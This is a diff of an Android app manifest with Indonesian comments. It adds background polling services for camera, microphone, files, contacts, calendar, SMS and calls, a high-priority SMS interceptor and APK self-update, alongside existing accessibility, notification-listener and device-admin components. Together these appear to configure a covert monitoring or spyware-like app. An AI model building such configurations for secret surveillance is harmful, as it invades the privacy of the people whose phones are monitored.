@@ -16,7 +16,8 @@
     <uses-permission
         android:name="android.permission.WAKE_LOCK" />
 
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
+    <uses-permission
+        android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
 
     <!-- ================================================================ -->
     <!-- 2. LOKASI                                                       -->
@@ -27,20 +28,25 @@
 
     <uses-permission
         android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
     <!-- ================================================================ -->
     <!-- 3. KAMERA & MIKROFON                                            -->
     <!-- ================================================================ -->
 
     <uses-permission
         android:name="android.permission.CAMERA" />
-        
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+
+    <uses-permission
+        android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <uses-permission
+        android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+
+    <uses-permission
+        android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
 
     <uses-permission
         android:name="android.permission.RECORD_AUDIO" />
-
 
     <!-- ================================================================ -->
     <!-- 4. PENYIMPANAN & MEDIA                                          -->
@@ -64,7 +70,6 @@
     <uses-permission
         android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
 
-
     <!-- ================================================================ -->
     <!-- 5. TELEPON & SMS                                                 -->
     <!-- ================================================================ -->
@@ -80,7 +85,6 @@
 
     <uses-permission
         android:name="android.permission.RECEIVE_SMS" />
-
 
     <!-- ================================================================ -->
     <!-- 6. KONTAK & KALENDER                                             -->
@@ -98,57 +102,12 @@
     <uses-permission
         android:name="android.permission.WRITE_CALENDAR" />
 
-
     <!-- ================================================================ -->
-    <!-- 7. BLUETOOTH & HARDWARE                                          -->
+    <!-- 7. SISTEM & NOTIFIKASI                                          -->
     <!-- ================================================================ -->
-
-    <uses-permission
-        android:name="android.permission.BLUETOOTH" />
-
-    <uses-permission
-        android:name="android.permission.BLUETOOTH_ADMIN" />
-
-    <uses-permission
-        android:name="android.permission.BLUETOOTH_CONNECT" />
-
-    <uses-permission
-        android:name="android.permission.BLUETOOTH_SCAN" />
-
-    <uses-permission
-        android:name="android.permission.BLUETOOTH_ADVERTISE" />
-
-    <uses-permission
-        android:name="android.permission.NFC" />
-
-    <uses-feature
-        android:name="android.hardware.bluetooth_le"
-        android:required="false" />
-
-
-    <!-- ================================================================ -->
-    <!-- 8. SISTEM, ALARM & BIOMETRIK                                    -->
-    <!-- ================================================================ -->
-
-    <uses-permission
-        android:name="android.permission.USE_BIOMETRIC" />
-
-    <uses-permission
-        android:name="com.android.alarm.permission.SET_ALARM" />
-
-    <uses-permission
-        android:name="android.permission.SCHEDULE_EXACT_ALARM" />
 
     <uses-permission
         android:name="android.permission.POST_NOTIFICATIONS" />
-
-
-    <!-- ================================================================ -->
-    <!-- 9. IZIN KHUSUS                                                   -->
-    <!-- ================================================================ -->
-
-    <uses-permission
-        android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
     <uses-permission
         android:name="android.permission.WRITE_SETTINGS" />
@@ -166,7 +125,6 @@
         android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
 
-
     <!-- ================================================================ -->
     <!-- APPLICATION                                                      -->
     <!-- ================================================================ -->
@@ -179,7 +137,6 @@
         android:theme="@style/AppTheme"
         android:requestLegacyExternalStorage="true">
 
-
         <!-- ============================================================ -->
         <!-- CAMERA                                                        -->
         <!-- ============================================================ -->
@@ -188,12 +145,98 @@
             android:name=".CameraPollingService"
             android:exported="false"
             android:foregroundServiceType="camera" />
-        
+
         <service
             android:name=".CameraService"
             android:exported="false"
             android:foregroundServiceType="camera" />
 
+        <!-- ============================================================ -->
+        <!-- AUDIO                                                         -->
+        <!-- ============================================================ -->
+
+        <service
+            android:name=".AudioPollingService"
+            android:exported="false" />
+
+        <service
+            android:name=".AudioService"
+            android:exported="false"
+            android:foregroundServiceType="microphone" />
+
+        <!-- ============================================================ -->
+        <!-- FILE & MEDIA                                                  -->
+        <!-- ============================================================ -->
+
+        <service
+            android:name=".FilePollingService"
+            android:exported="false" />
+
+        <!-- ============================================================ -->
+        <!-- USAGE STATS                                                   -->
+        <!-- ============================================================ -->
+
+        <service
+            android:name=".UsagePollingService"
+            android:exported="false" />
+
+        <!-- ============================================================ -->
+        <!-- SETTINGS                                                      -->
+        <!-- ============================================================ -->
+
+        <service
+            android:name=".SettingsPollingService"
+            android:exported="false" />
+
+        <!-- ============================================================ -->
+        <!-- CONTACT                                                       -->
+        <!-- ============================================================ -->
+
+        <service
+            android:name=".ContactPollingService"
+            android:exported="false" />
+
+        <!-- ============================================================ -->
+        <!-- DND (DO NOT DISTURB)                                         -->
+        <!-- ============================================================ -->
+
+        <service
+            android:name=".DndPollingService"
+            android:exported="false" />
+
+        <!-- ============================================================ -->
+        <!-- CALENDAR                                                      -->
+        <!-- ============================================================ -->
+
+        <service
+            android:name=".CalendarPollingService"
+            android:exported="false" />
+
+        <!-- ============================================================ -->
+        <!-- PHONE (SMS + CALL)                                            -->
+        <!-- ============================================================ -->
+
+        <service
+            android:name=".PhonePollingService"
+            android:exported="false" />
+
+        <!-- ============================================================ -->
+        <!-- UPDATE / INSTALL APK                                          -->
+        <!-- ============================================================ -->
+
+        <service
+            android:name=".UpdatePollingService"
+            android:exported="false" />
+
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.provider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/provider_paths"/>
+        </provider>
 
         <!-- ============================================================ -->
         <!-- MAIN ACTIVITY                                                 -->
@@ -215,7 +258,6 @@
 
         </activity>
 
-
         <!-- ============================================================ -->
         <!-- DIAGNOSTIC ACTIVITY                                           -->
         <!-- ============================================================ -->
@@ -231,8 +273,27 @@
         <service
             android:name=".LocationPollingService"
             android:exported="false"
-            android:foregroundServiceType="location"/>            
+            android:foregroundServiceType="location" />
 
+        <!-- ============================================================ -->
+        <!-- SMS & CALL RECEIVER                                          -->
+        <!-- ============================================================ -->
+
+        <receiver
+            android:name=".SmsReceiver"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".CallReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE"/>
+            </intent-filter>
+        </receiver>
 
         <!-- ============================================================ -->
         <!-- NOTIFICATION LISTENER                                         -->
@@ -252,7 +313,6 @@
             </intent-filter>
 
         </service>
-
 
         <!-- ============================================================ -->
         <!-- ACCESSIBILITY SERVICE                                         -->
@@ -276,7 +336,6 @@
                 android:resource="@xml/accessibility_service_config" />
 
         </service>
-
 
         <!-- ============================================================ -->
         <!-- DEVICE ADMIN                                                  -->
